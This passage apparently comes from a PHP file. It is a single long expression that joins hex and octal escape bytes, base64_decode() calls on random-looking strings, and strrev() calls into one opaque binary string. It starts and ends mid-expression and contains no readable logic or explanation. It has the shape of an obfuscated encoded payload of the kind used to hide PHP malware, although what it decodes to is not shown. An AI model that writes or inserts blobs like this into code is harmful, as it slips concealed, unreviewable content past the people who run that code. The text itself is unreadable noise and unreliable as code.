0\xe3\x40\x95\x96\x64\x8d\x1c\x15\xb3\x8\x17\x27\xe8\xfa\x96\xa2\xb6\x3c\xe4\x5\xc4\x92\xe4\xb9\x62\xaa\x95\xd5\xd8\xa5\xa2\x85".base64_decode('7TzyOp9/JYvfe2AlbhXt5WzXQ3NVTRmQGA41qS0hUF0MdIbUWCwiuYMglo0r1KWR')."\26\265\71\22\131\32\202\71\6\130\255\227\310\40\266\204\23\167\305\70\46\54\342\360\365\212\254\51\46\363\31\330\370\36\357\245\61\5\364\55\321\144\156\156\13\104\271\226".strrev('GxP=F#½«¸Hæ•Ë"Ú'."\0".'Çpq€×P0\\¢‹èfÿeb¨>‹Èºo_lû')."\104\112\47\272\314\220\314\34\64\224\47\103\365\301\316\160\240\71\250\204\72\342\21\146\254\300\325\111\211\231\112\214\307\31\12\212\226\316\35\60\100\171\32\221\115\151\344\32"."\171\115\60\107\273\75\325\75\125\75\123\173\152\172\152\127\373\172\254\136\277\264\61\31\362\360\100\244\263\5\272\127\317\103\51\13\126\147\173\54\166\22\130\327\105\242\201\346"."\60\153\112\123\40\6\301\110\163\210\6\336\271\370\326\267\357\335\370\316\346\233\307\317\336\200\52\332\261\351\307\73\56\275\23\361\41\230\367\270\371\274\167\36\330\270\343\342"."\155\73\316\3\236\101\171\167\333\135\157\337\377\340\73\27\337\60\176\363\145\73\56\271\347\235\115\247\321\204\367\176\175\353\370\71\67\360\206\51\357\135\364\300\216\215\327\162"."\176\204\262\41\36\124\372\275\323\67\274\163\377\315\230\33\371\325\51\73\356\70\167\307\25\33\306\317\271\172\374\362\33\336\331\270\155\374\227\77\31\77\143\303\273\333\176\66"."\331\75\221\150\274\233\15\5\30\250\372\127\141\173\134\212\336\36\153\32\106\155\55\372\255\301\266\17\350\227\251\160\23\265\336\223\272\202\35\315\101\267\55\221\34\5\357\25"."\x53\xe9\xc\xa1\x7a\x2b\xc0\x3a\x5a\xe0\xfd\x82\xc5\x89\x11\x7c\x43\xf5\x84\xad\x58\xb\xe3\x2f\x35\x4a\x6a\x4c\x4b\x30\xd6\x1c\xd\x35\x5\x41\xbb\x9e\xf\xd4\x14\xc2\x3c\x81\xd2\x2\x82\xc6"."\242\313\170\230\33\110\226\171\33\121\152\330\144\256\125\34\35\321\174\111\63\133\312\345\111\143\225\52\254\246\121\345\301\33\14\61\154\122\252\360\6\211\0\172\22\55\275\32"."\354\242\200\350\343\126\257\254\366\324\171\246\327\52\340\212\204\226\0\7\44\112\25\50\171\363\162\216\217\170\22\216\330\164\117\135\255\122\125\30\250\202\166\11\274\242\326\253"."\x34\xa7\xa5\x68\x9e\x1a\x68\xb0\xdc\x5c\x91\x17\x91\x47\xcb\x2e\x6a\x46\xde\xb6\x94\xa4\x87\x83\x78\x79\xf4\xeb\x70\x2a\x92\xf4\x89\x12\x74\x9c\x50\xe\x37\x4c\x9\x74\xb4\x38\x73\x52\x5f\x24"."\235\325\104\341\61\351\263\271\257\3\66\314\325\265\112\2\154\26\52\44\222\142\16\144\64\70\220\121\63\15\350\104\347\142\76\336\324\40\101\241\366\152\264\131\232\305\6\12"."\240\144\250\60\224\216\26\313\153\242\156\240\301\241\371\121\200\247\140\325\175\136\23\42\107\74\201\215\40\206\363\101\254\220\106\234\304\124\121\6\217\366\63\147\365\61\122\7"."\xce\x49\xda\x57\xf2\x3e\xb0\xb9\xac\x30\x4e\x83\xbb\x98\xc1\x96\x77\xc1\x78\x73\x1b\x9d\xe5\x31\x69\x9a\xa7\x12\x53\x1c\x13\x55\xa0\x53\x71\x4c\x11\x7e\x4a\x80\x7c\x74\xb9\x60\x82\xb0\xf\xc9"."\27\352\150\215\104\333\251\305\131\254\271\55\330\36\360\1\21\247\63\201\346\307\154\224\322\240\124\143\312\107\101\325\16\364\223\17\61\224\305\311\127\321\272\122\155\304\23\121"."\54\24\372\240\61\60\372\12\261\26\327\110\221\206\152\352\326\1\252\344\276\220\42\321\270\212\20\0\344\131\242\272\325\322\156\41\351\152\143\303\251\41\306\336\247\21\223\143".base64_decode('Mm8WqQRzmYQqx3U2RzpaQ8y4rgUOz4WU6cjUEg1hvwHwfYVVJZk0oohQkUCRwnCK').base64_decode('h4UJPE7gez6KiC0fRfhmg3NJvp3w92MdPCz4WBTpijGjCkx9l7fwcBu3fcYJkagU')."\x9\x44\x3\xed\x31\x1e\x8d\x2e\xe7\x46\x1a\x1c\x46\x8d\x35\xd4\x8e\xae\x76\x41\xf1\xc3\x81\x65\x68\xb2\x44\x4\x83\xc2\xa8\x75\x8d\x6f\x6a\x63\x6d\xf\xb5\x7f\xa3\x41\xfa\x73\x22\x8b\x61\x9b"."\240\336\65\323\75\312\234\165\265\220\207\131\214\251\166\306\310\63\106\22\177\345\244\260\32\216\54\246\161\342\163\52\230\117\211\243\206\322\255\40\256\66\56\270\132\213\155\135"."\x7c\x35\x28\x68\xe\x2b\xd4\xa8\x56\xe9\x88\x2c\xf\x8\x37\x46\x52\x2\x40\x84\x57\x23\xff\xaa\xee\x9e\xe1\x1e\x1f\x62\x16\xac\xd5\xc2\x9e\xad\xa5\x49\x61\x6c\x48\x33\x39\xaa\xd3\x13\x3d\x94".strrev('f!¨úñèN{k=©ÔZ°Ì²¿:'."\0".'¡+B`®şv2 ˆ$—1ök5vµtm°')."\136\172\74\242\111\152\160\5\332\143\143\61\207\5\244\112\74\365\100\355\250\227\20\242\253\226\106\26\302\17\34\254\26\2\173\12\321\105\15\174\60\203\47\255\355\100\377\26"."\307\327\6\321\277\60\372\11\307\321\160\31\74\3\132\222\341\320\322\340\132\374\237\110\250\345\210\244\266\102\316\2\241\216\265\350\177\104\140\326\206\72\334\225\65\5\343\313"."\203\101\232\201\205\341\127\144\105\4\7\272\52\371\44\303\312\370\220\54\224\363\241\152\125\255\41\310\364\366\116\253\125\125\277\325\5\363\205\373\206\250\251\76\176\172\65\354"."\41\201\130\263\240\276\216\11\121\76\27\210\352\274\163\42\160\117\133\20\137\34\215\164\165\112\361\266\300\262\120\307\142\26\363\117\145\241\251\120\265\322\22\212\41\24\65\263"."\xc9\x28\x1c\x80\xc9\x71\x60\x38\x9\x5b\x24\x73\xbd\x8e\x29\xdd\x82\x28\x3b\x8a\x48\x2c\x3b\x3e\xc\x50\xca\xec\x5c\x65\x4d\x5d\xa1\x70\x8b\x6c\xf4\x8d\x33\xc2\x86\x42\xa8\x3a\xec\x29\x53\x58"."\343\130\234\230\177\263\10\106\71\13\223\351\306\42\4\7\54\102\21\300\142\4\135\54\102\34\215\261\10\351\50\213\340\323\111\260\203\245\241\3\40\72\274\261\123\135\106\33".base64_decode('4laLC1IJyYcEpsE+KgTD7kPQiVHjokqXnJOInKRTPVWnUyTjaT8FIW6TANFvz+pG')."\302\15\257\146\23\223\132\350\332\161\303\316\72\276\2\226\174\350\53\41\142\76\51\175\207\231\57\20\1\237\152\112\102\146\262\121\313\0\41\122\242\22\151\220\336\12\311\14".base64_decode('ViMkcl0adR6hOF1azU9G4JXQA7/Qov3pTw9EmUQCTFKqPbDJMjMGp3vEnp6qibAF').strrev('5u‰ST ƒõ'."\n".'­BQ”#D·ˆ³ùS™Ã“h“íQ"ûd¼÷Á”¬£EZ Î').base64_decode('sFbN0SBeHTQXS6updsiaFlUrYBRd6ywV6mgJrlCqjdSIqmkqFFbQWmQVKWU1sRpo')."\x5b\xe1\xca\xc6\xca\x98\xc3\x8a\x3c\xbd\xd8\x79\xb9\x99\xc2\xe2\x62\xca\x95\xb1\x66\xc4\xa3\x1\x33\x40\xf5\xc0\xa1\x9c\xa7\x50\x8e\x98\x26\x85\x62\x68\xc3\xe\x87\x49\x4f\x51\x92\x61\x61\x46".base64_decode('1qNwxwMYiA8fVIYJFbEEWhFNCq6IRwMYSLjPffdBfwhBwaejYk6jVpmEZ/OtBiHB')."\152\7\213\110\231\107\314\44\302\14\42\133\236\324\47\236\102\44\5\24\315\262\34\141\51\160\335\64\326\31\15\265\7\242\53\1\145\342\14\0\53\320\314\72\154\163\105\304".strrev('„æaëDf”Beş7*¿PğÀò<'."\0".','."\r".'j,(Ë<è°§1œZÙjÔğë$º°')."\x31\x31\x54\xe\x91\x1c\x1e\x13\xa3\x6\x73\x1f\x46\x45\x4e\x95\xcd\xa5\x84\xe3\x4a\xbc\x49\xe2\x41\x66\xd4\xbe\x35\xd0\x15\x96\x21\x80\x2a\x65\x69\x70\xe5\xb7\xac\x11\xd6\xd2\x4a\x6b\x84\xa5"."\61\161\14\137\155\320\237\232\331\320\77\352\27\242\146\6\72\223\226\362\330\361\11\167\233\7\255\202\275\265\53\36\121\321\376\21\15\142\152\16\75\342\150\225\332\53\235\273".strrev('xŒ5BzƒÍå†¶AÃXWh(hûC`¡ÅÁO%Ï/êTòÆº[ôîpjAå')."\x62\x55\x16\x9f\x85\x22\x20\xc1\xf5\x25\x64\xa7\x20\xaa\xf0\x2d\xe2\xd3\x84\x6a\xb5\x5d\x2c\x49\xce\x1b\xd\x93\xa8\x31\xb7\x73\x8b\x7\xa2\x77\x8d\x26\x44\x40\xf8\x14\xe0\x52\x66\x92\x56\x4a"."\340\322\362\166\5\345\135\16\17\15\263\36\247\340\314\224\113\131\40\262\253\216\217\273\365\230\145\260\120\251\26\27\263\354\42\30\355\103\216\2\135\222\117\0\134\130\141\37".base64_decode('JFczeWfz0H6ZZc6MVF30JqdbFr+gJYcfFrQzwiWC7G+ypYlhrpS3Yzq7ZG9JEIV0').base64_decode('YUcmbHUkRXVy2yGGg3r+dBWEmkK8v1IuAQwLB5P4okHU2cuO8KKTYwbb2dzXdLyR')."\x79\xb3\x53\x2f\xe6\xc\x72\xa3\xb2\x5c\x98\xc6\xf0\x74\x5d\x9e\x0\x95\x10\xec\x9d\x2e\x7d\x41\x32\x6\xc4\x51\x18\x48\x7c\x65\x28\x59\x55\x94\xf2\xa8\x5d\x5e\xd9\x4e\x7\xd\x2c\x1\x4a\x96"."\1\314\75\46\215\315\5\325\23\156\235\144\367\1\204\375\26\131\212\117\270\174\41\165\142\336\305\53\134\60\244\64\331\44\122\162\376\74\131\36\161\62\164\142\342\245\15\331"."\37\203\117\370\332\344\163\371\104\216\160\154\52\14\367\334\230\17\116\253\122\133\72\171\376\44\167\252\114\261\41\241\231\0\150\220\254\76\245\136\64\242\15\265\324\54\216\112"."\x73\x40\x82\xb6\x33\x2f\x45\xe0\xe9\x33\x6c\xf6\x71\xc2\x81\xd8\x43\xf0\x4f\xe5\x20\x1e\xa1\x8\x94\xf5\xe9\xd8\x4e\x88\x5a\x6d\x60\xab\x2e\x5e\x90\x3a\x1c\xfb\xee\x42\x5d\x92\xb3\xd3\x9\xd6"."\x7b\xc5\x72\xcd\x90\x91\x7f\xb0\x48\x64\x39\xdf\xfd\xc1\xa8\x2e\xb6\x64\x54\x8c\x98\x65\x7d\x67\x21\x41\xff\xc8\x97\x48\x21\x89\x66\xba\xca\x90\xe9\x48\x4d\x48\x60\xe4\x33\x90\x2c\xe6\x18\x22"."\324\35\21\265\15\355\5\21\306\61\30\126\334\101\173\131\51\40\5\66\142\150\222\176\142\361\12\347\261\5\344\136\236\336\16\302\140\257\101\144\225\207\230\76\4\70\275\22"."\x3b\x75\x80\xfe\xac\xcc\xa5\xbc\xa8\xe1\x30\xeb\x52\xba\xcd\x9d\xd\x61\x6a\xc6\xac\x3\x71\x9b\x25\x13\xe1\x1c\xa7\x7e\xc3\x92\xff\x46\x6d\x48\xc7\x56\x58\x4c\xda\x51\xa6\x96\x2\x5d\x29\xef"."\x1c\x34\x11\xdf\x4a\xc5\x22\x5d\x51\x76\x75\x82\xe3\x58\x64\xa4\x46\x83\xcd\x2b\xf9\x2d\x6\x87\xb6\x6\x96\xb9\x21\x21\x2c\xf2\xb\x2c\xae\x8\xe6\x82\x28\xc\x27\x27\x3e\x35\x1a\xc1\x12\xbb"."\x60\xb8\xd5\x55\x20\xd6\xc6\xdd\x6d\x3a\x61\x6a\x38\xd4\xb1\xb4\x62\x2\xe2\x1b\xda\xa5\x22\x14\x18\x8a\x7\xdb\xdd\x30\x67\xd\xb1\x60\x20\xca\xfc\xb4\xe2\x78\x53\x38\xd2\x2c\x25\x87\x22\xe5"."\230\340\214\11\7\122\171\37\5\372\127\325\364\254\41\107\226\172\164\162\111\255\305\202\1\257\332\73\255\266\261\147\135\155\115\217\277\321\67\225\313\263\50\271\222\154\120\47"."\0\133\154\23\251\167\3\360\376\303\200\264\30\304\374\76\37\174\204\7\374\75\176\346\321\312\317\23\171\46\327\316\1\316\221\143\324\51\220\243\171\56\157\31\314\14\335\347"."\xf6\xfb\xa9\x62\x73\x57\x95\x2f\x34\x7c\x7\xaa\xc6\x56\xc6\xf8\x90\xd0\xf9\x59\x29\xdd\x31\x9\x69\x36\x59\xe3\xc0\x95\x19\xfd\xeb\x94\xb3\x62\x25\x97\x8a\x19\x1d\xb3\xd8\x61\xee\x2b\x83\x7c"."\206\51\26\210\130\311\51\63\131\302\76\210\304\260\10\343\140\4\362\71\252\100\64\174\100\34\273\141\41\306\330\202\315\243\355\21\366\337\146\304\105\56\156\13\55\131\32\156"."\xef\x88\x74\x9e\x14\x8d\xc5\xbb\x96\x2d\x5f\xb1\x12\x1c\x31\xd6\xb3\x79\x92\x56\xbc\xcc\x85\x18\xf8\x14\xf5\xf\x69\x45\xff\x10\xf3\x8a\xbd\xc\x1f\x2\x74\xcb\x2f\x33\x57\x1c\x88\xfa\x88\x68".base64_decode('IKNgfiob4KmYYPgrJ9Ha/Lm8PX2CHJ1FPWGa9gSpy9q/vWJI7O6xevnETOlDEBRa')."\145\226\70\372\0\137\341\225\275\163\343\251\52\263\172\251\204\213\1\0\200\170\100\101\142\23\4\220\130\122\12\127\265\114\243\162\224\135\203\20\377\135\315\46\377\14\170\317".base64_decode('XIy9ZzLPmYPEp6PbIeSgVxtwpAvXt4NedER0xF1OIbGuAfd/iyMWj8lLgmwVXFkG').base64_decode('b0htrtXIgdxPb4yoEdYrs8CZdStijSXTSOZOWLBOmN0i/ptp1KMIN/hM3kkPEZNd')."\13\204\370\206\21\374\164\122\166\37\300\50\154\156\100\250\145\345\6\270\72\105\322\301\141\340\315\274\125\322\336\22\114\4\170\244\107\151\115\243\114\5\12\314\53\233\106\243"."\322\263\37\16\327\15\262\17\177\255\120\150\316\340\76\70\126\255\3\224\224\43\151\254\4\42\53\217\200\50\217\352\216\372\120\162\13\345\344\122\74\277\45\102\174\24\323\322".strrev('‘RÊä]„|còËMøØL·òK¼Ê·9Ú>ÆzwÍ—Ã™{,Õ‘Å±mª1Kª:ø')."\xbb\xb4\x70\xf6\x8d\x3e\xb2\x22\x9d\x2e\xc1\x25\x18\x77\x88\xcb\xdd\xe5\xa\x9f\xba\x54\xd6\x4c\xc3\x41\xee\xa7\x4\x71\xbd\x81\x3e\xec\x9a\xc2\xcc\xb3\x7\x1a\x82\x23\x5\xd3\xd2\x65\x17\xcd"."\x29\x9d\xf8\x87\xe4\xb6\xd8\x92\xe7\xe3\x9c\x36\x82\x57\x10\xd3\x21\x93\x7c\x20\x33\x8f\xc2\xb2\x73\x3e\x8c\x40\x6f\xce\xe1\xb3\x7d\xc4\x8b\xba\xee\xf2\x22\x6c\xe9\xfa\x0\xd3\x74\x93\x38\x60".base64_decode('fsrt5N6B3d3BeBWLucj9QdNrSm9FgFfyaUBnseRdHLULqsbNhJNwhuCGHZHpz8mV')."\172\355\55\12\167\315\150\54\351\233\0\113\365\121\346\12\331\105\153\134\336\223\173\26\367\264\367\304\145\64\331\105\55\235\106\315\226\334\165\72\332\42\234\65\303\164\44\156".base64_decode('/BkyJnb1DNL4Eyp6ioZEwvL6i+RJHs8wZyv85D2QCnP3JAyH2ZsWypeFkvQkjTxf')."\360\166\301\237\21\301\107\145\352\140\233\121\177\342\370\32\34\353\67\260\36\41\324\345\233\314\24\354\254\153\252\320\114\254\252\257\72\276\6\375\326\126\171\252\60\103\104\342"."\170\24\61\200\264\243\252\376\370\32\22\250\5\47\43\143\314\44\102\170\46\25\127\300\40\335\151\104\250\225\356\55\32\11\66\60\55\230\341\237\341\37\6\372\320\70\210\277"."\x28\x5e\xc7\x70\xfb\x88\x1e\x51\xb5\xdc\x18\x93\xc7\xab\xb2\x1f\x64\xf0\xb0\xc\x58\x97\x53\xda\x78\x4b\x98\x87\xe4\xf6\x16\xa8\x7e\x85\x37\xd0\x7e\xb2\x57\xf8\xa\x5e\xd8\x38\x92\xcb\x2a\x70".base64_decode('zGmonu6rq1bY6ykN1V3xVu+86sZF+y5sJreYtt6OryHxIZyePhfBLcNCvLx4xO+M').base64_decode('TVQW5l9OGzPz2rCFKFTOlwRkdnEqJvx053V72CzCFS3wbjOYDURGoj05iy1tIvGo').base64_decode('x4I51v2uwmgp78VnYG9M9iPnehKgzpkfn2Kd+WXSmBTkIyeC9HmHekV+80Nyjksk')."\44\164\125\62\155\3\200\141\252\311\100\202\202\246\205\12\70\46\211\252\223\44\236\350\152\57\106\265\27\61\13\170\376\243\105\145\33\222\147\153\71\213\363\141\11\367\163\23"."\156\54\220\42\170\160\275\362\73\26\43\210\263\303\311\330\243\275\27\217\257\327\110\115\224\42\26\165\305\246\46\141\252\124\312\322\125\62\122\356\117\222\133\161\157\251\304\76".base64_decode('WLFSme9kGUgnQrw+2UE6PpF7+SWA2/+64NW1cmfxaPEqM2bWz55fzyyUTmCX+qUC')."\xd3\xc2\x45\x41\xe6\x4c\x7e\xb2\x3f\xcd\xe8\x80\x78\x69\x82\xf5\xd\xf\xb8\xe4\x76\xdf\x1\x16\x68\xe4\x2b\x9c\x11\x10\x47\x3e\xd1\x5a\xc7\x1b\x26\xd0\x51\x7a\x4e\x94\x9e\x7\x20\xa2\x5b\xba"."\x92\xb0\xaa\x8b\xca\x1f\x51\xa8\x40\x49\x11\xd3\xcf\x36\xc\xd8\x76\xa5\xd7\xce\xf8\x80\xf4\xb1\x40\x91\xe7\xd7\xc4\x12\x49\x64\x7\x44\x4f\x12\x58\xe1\x18\x66\xf8\x0\x6a\xa8\x29\xd8\x2d\xb2"."\xe5\xca\x72\xd1\x4c\x29\x3f\xd0\x20\x25\x2a\xb6\x69\x2a\x39\x2d\x3f\xa\x5c\xec\x14\xab\x7e\x8a\xb5\x0\x7f\xa8\x1\xab\x5a\x5b\x28\x2\xf4\x9a\xbb\x56\xc5\xfb\x88\x70\x84\x47\xdd\xb8\x40\xa"."\x15\x54\xfb\xf0\xdb\x27\x3e\xbc\x49\x45\x99\x2d\x16\xb9\x1b\x45\xbb\x91\xeb\x7e\x54\x7e\xbf\xae\x33\x5b\xe2\xf\x58\x14\x48\x18\x3a\xd1\x19\xee\x5a\x1c\xea\x90\x94\x76\x24\x80\xda\xdc\xd2\xa1"."\6\72\73\53\46\160\236\6\13\261\360\215\267\257\237\135\4\44\331\304\133\150\344\372\224\44\126\351\157\250\302\320\52\305\52\46\231\17\332\52\77\220\132\222\101\34\15\26".strrev('ğ«hÒß 	à\'òbÕÁAğãş|,)¢_„<|Eú‹ÕÉ¢^O¨ÒQ¤P').strrev('ÜQW ÷Áóó1ÆMEñx‰É¯Ğ²Uváw"àN¹²Ú•«jÈš¡º¢…5(£¢')."\x3c\x56\x93\xa7\x29\x9a\xb5\xfc\xb2\xf2\x22\xb8\x72\x5f\x52\x4e\xa2\x23\x49\x6c\x2a\xca\xf3\xfb\xc9\xa1\xd4\x2f\x8e\x42\xce\xfb\x8\x2e\xbe\xaf\x30\x29\xa\x5a\x72\x0\x4f\x35\xb1\x2f\xc0\x97"."\40\241\23\237\135\150\202\303\377\276\55\51\43\224\260\125\21\21\377\26\305\63\60\153\326\320\212\60\53\260\156\135\71\14\364\31\335\111\201\202\341\6\341\371\342\206\341\63"."\xa4\x80\xa1\xd\xce\xf9\x19\x3a\x57\xe5\x4c\x2\xc2\xf2\xd0\x5f\x51\x26\xdc\xb1\x58\x44\xe8\x82\x72\x24\x76\x33\xd5\x61\x12\xeb\xe9\xae\xf6\x4d\x5d\xb7\xce\x6f\x30\xad\x1f\xa6\xa1\xc0\xca\xfa".base64_decode('eG4a7/E586OeAOp5RgC4c1LGcgksuX39U4UlFNfuUbDKT0PDom5+udHL0hh3aEyf').strrev('|ü$k;ä°EŸ¨ä(9UŠüCµNÿœˆ©M©òÿÁæÁç/ã,}Ç')."\x53\x69\xb8\x2f\x29\xc\x88\x58\x16\x42\x61\x5c\x70\xac\x9a\xe3\x4a\xc0\x4f\x64\x12\xf0\x10\xa2\x92\x88\x1d\xeb\x77\xc3\x51\x5d\x1c\xc8\x3\xb\xad\x64\xd1\x28\xd8\xe\xea\x44\xdf\x34\xac\x22"."\17\320\364\153\103\32\315\122\245\300\301\275\241\212\270\147\257\102\324\210\246\0\31\20\115\131\210\311\216\122\324\263\15\125\244\271\126\106\327\121\171\102\130\52\175\4\25\254"."\122\30\115\314\151\34\143\105\333\104\73\42\67\120\201\347\240\272\242\240\364\37\350\200\333\206\343\126\321\337\343\217\343\344\37\77\112\226\325\213\124\245\231\20\31\162\317\225"."\x16\xd2\x19\x78\x96\xaa\x33\x1a\x89\x47\x9a\xd9\x2b\x3e\x95\xc4\x38\xdc\xaa\xd7\xa2\x46\x57\xe2\xe4\xc3\xc\x53\xf8\xcd\x3f\xcb\xc1\x79\x4\x3f\x40\x60\xdc\x8b\xa5\x7c\x9e\x2b\x51\x61\xa6\x91".base64_decode('b2RYKUNdEot0sDcx4nza4OdLfUq3xu5FQPuSXvTEMiVbbJrY0XscW5xaAJZc32HH').strrev('{L¿£¦ëyÕÕÔg'."\0".'ŞdÖvı	!óÒ}×8È êœ‚>°–n˜ìÇPÚ÷jn¢¨{')."\227\371\40\253\147\326\330\122\226\272\272\172\362\227\46\20\301\40\14\212\63\5\55\176\106\265\40\303\260\256\103\203\140\43\310\31\371\22\343\263\272\233\261\215\221\202\233\326"."\xcb\x58\xb\xd6\x7e\x34\x1e\xc4\x49\x1f\x23\x20\xb\xa4\xd3\xe1\x2\x85\x5c\x80\x41\x4c\x77\x23\x81\xdf\x2c\xc2\x8\xcb\x1e\x9c\x59\x18\xb1\x3b\x68\xb4\x9\x52\xa0\xbd\xdc\x64\xd\x65\x13\xf3"."\150\1\265\20\154\340\215\12\346\123\335\362\307\174\14\271\24\50\274\16\173\131\202\127\176\45\0\12\321\255\101\110\320\35\115\103\145\234\336\377\60\4\155\314\111\336\117\14".base64_decode('kIQomHeTPBriqCwoJ8nc7ovEstwcHUc7eE30MQr6Mi/gsMJ0zZjDqtiFcXQJjxGU')."\xe2\x53\x14\x9b\x86\x29\xc9\x36\xf\xe3\x95\xd1\x63\x29\x3b\x17\x3c\x89\xeb\x6f\xb8\xcd\x27\x36\xda\x3\x46\xd6\x61\x99\xaa\x4a\x45\x65\xdc\x2e\xc0\x19\x59\x4f\xe2\xce\x92\xb8\x22\xb4\xa2\x3"."\xfc\x49\xe\xaa\x5d\xc7\xda\xa6\xc0\xd2\x3\xf6\x1\xef\x20\xe4\xbd\x3c\xaa\x10\x59\xbf\x6f\xd9\xe0\xda\xee\x81\x25\x63\x54\x34\x85\x99\x69\x99\x4e\xb\x8b\x49\x23\xc5\x84\xbf\xb1\xef\x50\x3b"."\x61\x90\x20\x3\x50\x8d\x8d\x66\xee\xfa\x4f\xaa\xc0\x9d\xe4\x2a\x13\xa0\x32\xe3\xb2\x2\x0\x2f\xcf\x4d\xe4\xec\x15\x72\x63\xb8\x2b\x37\x71\xfa\xd7\xcc\x7d\x99\xca\x9e\x0\xe9\x6d\xb6\xa4\x41"."\141\201\57\166\161\175\315\352\30\222\16\130\276\102\321\354\103\243\156\311\110\103\360\316\312\140\236\275\74\147\205\114\274\365\162\76\31\210\205\370\354\325\112\230\316\302\324\125"."\23\217\346\112\131\205\320\131\2\72\127\263\224\320\314\137\316\221\201\370\300\46\53\54\20\65\123\147\35\370\44\350\204\360\226\175\313\244\143\47\170\33\136\70\225\225\354\150"."\x36\x41\x91\xb0\x74\x45\x96\x1\xab\x8e\x69\xc2\xe6\x2a\xd3\x8f\xc0\x18\x12\xd7\x92\x4e\x38\x85\xd1\x33\xb6\xe3\x66\x24\x4e\x8\x5d\x56\x67\xf\xae\x2\x29\x24\x8b\xa\x57\x40\xf4\x48\x5c\x48"."\x15\xb\x1\x96\x6e\x43\x83\x5c\xcc\x99\xf6\xe6\x19\x3f\x65\x81\x8b\x58\x2e\x8c\x56\x2e\x22\x94\x65\xe7\x18\xa5\xaa\x2c\xfe\xc0\x2b\xba\x8d\xbf\xf3\x59\x61\x22\x3a\x27\x5b\xd9\xac\x22\xfc\x1".base64_decode('rqCek0IphmsHQuZBhzyLSuo8GKzQxy+VvM4NjJ2DKheA92tMxE9hP6JyIVxXl4tE')."\x2d\x75\x50\x44\xde\xd6\x6e\xd2\x58\xa6\xa3\xa5\x4c\xf1\xcd\x0\xfd\xb1\x29\xcc\x21\x3d\xa5\xc7\xe2\xce\xd1\xf\xdd\xee\x46\xdd\xea\x45\x4c\xbd\xd8\x4d\x60\x40\xba\x29\x35\x66\x75\xe2\x26\x43".base64_decode('KMXGZ7CkM05dcW600rahSHUCFY9niqbND3U4HU1LEQnL3FucFvEuEp913JBJvpl5')."\x56\xb4\xcd\xb3\xaf\x6b\xac\x45\x44\xef\x89\xf8\xb6\x96\xce\x99\xae\xa8\x5b\x4b\x8c\x6c\xd3\x36\xdb\x69\x99\xb3\x6b\xa1\x40\x85\x47\x35\x26\xa9\xd5\x54\xf8\x2\x14\xe2\x45\x80\x7f\x28\xea\x49"."\263\110\304\14\222\133\202\274\35\325\373\344\150\330\344\342\25\174\263\245\127\250\2\173\202\221\126\75\136\4\350\340\137\222\375\312\110\76\261\121\114\162\176\56\361\201\336\351".base64_decode('CmcgVVozjUyTEkj+SrykSw4oGS0QuUaslODXMS4Oj9lBKDIDxQwbcAXExQfugSWn')."\241\152\261\157\132\321\63\271\10\371\146\131\21\232\206\171\30\341\50\103\116\261\260\127\363\56\66\154\225\122\52\174\212\44\111\30\115\162\327\101\200\35\201\44\110\30\325\231"."\x26\xa1\x77\xfa\xc\x2f\xf3\xce\x25\x1b\x49\xb0\x43\x4\x90\x71\xb4\x16\xa4\x69\x80\xcf\x5b\x8c\x8a\x80\x1e\x1e\xe4\x13\x79\x4c\xe9\x52\x8b\x38\xcf\x10\x2e\x3\x88\x9f\x10\x3e\x9e\xc4\xa1\x8"."\x8f\x15\xa5\xad\x5c\xe7\x3a\x7a\xc4\xb3\x86\x4c\x55\xc5\x9d\x39\x55\xdd\xc3\x19\xba\x2a\xa5\x53\xc\xe1\xe4\x16\x87\xb2\xa5\x2b\x3\x5a\x19\xce\x74\x70\x6f\x2e\x1a\x43\x9d\x7b\x98\xe\x4d\x18".base64_decode('VyXgRF924E5KiX4IjVMEMqkTdQkx4u6f+hxhqrOcLglw3OTAcv0BPCuhSmo+Cu9K').base64_decode('1tRi81GHWKt9lBv5YW0cvEdyFUtLjrBUPjktR4RqHzlKcxDPNawzS1Amfuls6/Rz')."\120\23\137\236\364\344\56\134\35\65\63\25\37\361\334\375\160\316\110\52\341\310\342\120\163\40\334\22\212\55\125\372\164\133\21\212\16\344\21\4\347\122\46\62\106\212\170\66"."\253\23\334\37\77\16\172\23\210\141\367\246\370\241\306\22\307\27\111\7\113\172\312\310\131\55\235\177\172\261\254\306\74\66\360\310\226\225\301\222\323\12\271\263\102\244\50\145".base64_decode('LhT18vyjOnmvXrRYKlCq0BrIX/kL5NEEOTfiQ/T8RI038kOGZYiFz0qMyrUHWtpD')."\35\152\40\34\216\54\167\350\252\11\231\161\221\77\121\221\222\137\264\220\106\106\14\2\375\172\271\7\56\360\137\44\73\17\167\111\61\350\360\311\316\330\12\354\222\4\36\345"."\xe3\xe\xee\x69\x54\x7a\x70\xa6\x50\xd4\xc\x4b\x97\x0\xf4\xa1\x94\xa9\x60\x4f\xa1\x65\xb3\x8e\xa7\xe6\xb2\x69\x29\x5a\x72\xee\xac\x15\x3f\xa5\xd2\xf\x30\x98\xe4\xf8\xad\x52\x86\x28\x7e\x25"."\xfe\x7f\xdd\x54\x23\x25\x9c\x2e\x19\x29\xa6\xab\xc1\xcd\xdf\xa8\xef\xfb\x66\xf9\x59\x42\xf6\xcd\xb2\x47\x75\xbe\xf3\x79\x1e\x8f\xb8\x56\x52\x89\x5b\x1a\xf6\x4a\x98\x49\x4e\x23\xc0\x2a\x53\x58"."\x28\xa2\x12\x39\xab\x2a\x3e\x81\xce\xc9\xc5\xd1\x82\x7c\xaf\xe7\x4f\xf9\x39\x8a\x69\x0\xfb\x96\xb\xb2\xcb\x24\x1c\x11\xe7\x2\x9c\x1d\x6a\xc3\x9f\xa3\xa7\x45\x74\x8\xc6\x32\x2f\x76\x82\x60"."\272\207\210\116\0\236\35\367\332\256\207\206\334\152\232\216\267\333\313\276\101\274\334\323\264\156\334\35\224\263\127\164\16\305\370\53\26\242\250\73\245\102\3\120\262\42\104\112".base64_decode('PIPSoNTRN6/4CwXKQmbMKz5AvEEFcwXbcZJukxW1pbGhAMLpiJMS1jgyc6NlAIcc').strrev('åo)+9ş\\“šAKÿüZ™ü»u×bvG£®_Ou¬dã)´ù